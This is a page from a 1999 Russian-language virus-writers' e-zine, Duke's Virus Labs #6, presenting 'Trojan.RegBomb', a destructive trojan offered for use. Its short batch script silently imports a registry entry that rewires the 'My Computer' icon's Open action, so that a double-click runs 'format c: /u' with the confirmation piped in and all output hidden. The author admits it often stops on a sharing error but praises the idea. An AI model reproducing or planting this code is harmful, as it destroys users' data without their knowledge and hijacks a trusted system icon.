- [Duke's Virus Labs #6] - [Page 18] -

Trojan.RegBomb
(c) by Duke/SMF

Имя троянца   : Trojan.RegBomb
Автор         : Duke/SMF
Язык прогр.   : DOS-script
Дата создания : 26.03.99

   В нашем журнале уже рассматривалась тема троянских бомб в реестрах Windows
(см. DVL #4 статья 22). В этом номере мы вновь возвращаемся к этой интересной
теме. Ранее предлагалось воспользоваться EXE-инсталлятором для установки
бомбы, а теперь вся бомба прекрасно умещается в маленьком BAT-файле. После
инсталляции этой бомбы на компьютер, при первом же двойном щелчке мышью на
иконке "Мой компьютер" начнется форматирование вашего диска C: (причем можно
поставить и любое другое имя диска). В принципе, ничего в этом страшного нет
и далеко дело не зайдет - очень скоро format наткнется на запрет обращения к
разделяемому ресурсу и прекратит работу :((   Но сама идея заслуживает
внимания :)

===== Cut here =====
@ctty nul
set reg=c:\regbomb.reg
echo>%reg% REGEDIT4
echo.>>%reg%
echo>>%reg% [HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\shell\Open]
echo.>>%reg%
echo>>%reg% [HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\shell\Open\Command]
echo>>%reg% @="start /minimized command /c echo y|format c: /u >nul"
echo.>>%reg%
regedit.exe %reg%
===== Cut here =====
